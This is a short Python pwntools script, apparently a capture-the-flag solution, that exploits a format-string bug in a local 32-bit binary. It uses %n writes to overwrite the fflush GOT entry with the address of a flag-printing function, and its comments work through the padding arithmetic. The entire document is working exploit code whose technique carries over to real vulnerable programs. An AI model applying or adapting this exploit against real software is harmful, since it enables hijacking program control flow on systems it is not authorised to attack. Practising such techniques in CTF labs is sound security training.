from pwn import *

target = process('./32_new')
# gdb.attach(target, gdbscript='b *0x80487dc')

target.recvline()

# flag method: 0x0804870b

# addresses to overwrite
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

# amount of bytes to be written
# first byte (0x0b): by default printf writes 0x52, so by adding 185 bytes we got to 0x10b, the 1 overflowing
flag_val0 = bytes('%185x', 'utf8')
# next 2 bytes (0x0487): after the first write we'll have 0x010b on the 2nd and 3rd bytes. We'll need 892 bytes to get to 0x0487.
flag_val1 = bytes('%892x', 'utf8')
flag_val2 = bytes('%129x', 'utf8')

# format strings
## %n	      Number of characters written by this printf.
fmt_string0 = bytes('%10$n', 'utf8')
fmt_string1 = bytes('%11$n', 'utf8')
fmt_string2 = bytes('%12$n', 'utf8')

# payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2
# write 0x0000010b
# payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0
# write 0x0000010b
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2

target.sendline(payload)

target.interactive()